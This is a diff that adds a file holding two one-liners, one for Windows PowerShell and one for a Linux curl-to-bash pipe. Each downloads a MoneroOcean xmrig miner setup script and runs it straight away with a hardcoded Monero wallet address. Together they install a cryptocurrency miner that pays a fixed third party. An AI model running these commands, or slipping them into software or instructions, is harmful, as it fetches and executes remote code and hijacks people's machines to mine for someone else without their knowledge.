@@ -1,0 +1,7 @@
+Windows 
+
+powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.bat', $tempfile); & $tempfile '46bwaQgprZL7CjHbqMuCtzMhyXvKsXkwXZ1TAtbLtSuH1bHKQgokrkB4Zt7LPUKGqAgSh9iwomnjv3rAqoZkAoHo8jV5T9K'; Remove-Item -Force $tempfile"
+
+Linux
+
+curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s '46bwaQgprZL7CjHbqMuCtzMhyXvKsXkwXZ1TAtbLtSuH1bHKQgokrkB4Zt7LPUKGqAgSh9iwomnjv3rAqoZkAoHo8jV5T9K'
